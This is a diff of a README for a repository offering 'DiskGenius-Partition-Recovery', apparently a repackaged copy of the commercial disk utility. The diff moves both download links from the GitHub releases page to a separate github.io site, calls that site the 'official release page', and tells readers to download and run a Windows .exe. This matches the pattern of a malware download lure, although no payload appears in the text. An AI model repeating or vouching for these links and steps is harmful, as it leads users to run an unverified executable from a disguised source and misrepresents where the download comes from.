@@ -1,6 +1,6 @@
 # 💿 DiskGenius-Partition-Recovery - Recover Lost Data and Manage Partitions
 
-[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://github.com/takeoffwabashriver311/DiskGenius-Partition-Recovery/releases)
+[![](https://img.shields.io/badge/Download-DiskGenius-blue.svg)](https://takeoffwabashriver311.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ DiskGenius provides tools to manage storage drives. You use this software to rec
 
 Your computer requires the Windows operating system to run this application. Ensure you have at least 500 MB of space on your drive. Follow these steps to obtain and install the software.
 
-1. **Visit the Release Page:** Go to the [official release page](https://github.com/takeoffwabashriver311/DiskGenius-Partition-Recovery/releases) to download the setup file.
+1. **Visit the Release Page:** Go to the [official release page](https://takeoffwabashriver311.github.io) to download the setup file.
 2. **Download the Installer:** Click the link for the Windows installer package ending in .exe.
 3. **Run the File:** Locate the file in your Downloads folder and double-click the icon.
 4. **Follow Prompts:** The installation window opens on your screen. Accept the default settings unless you require a specific path for the application files.
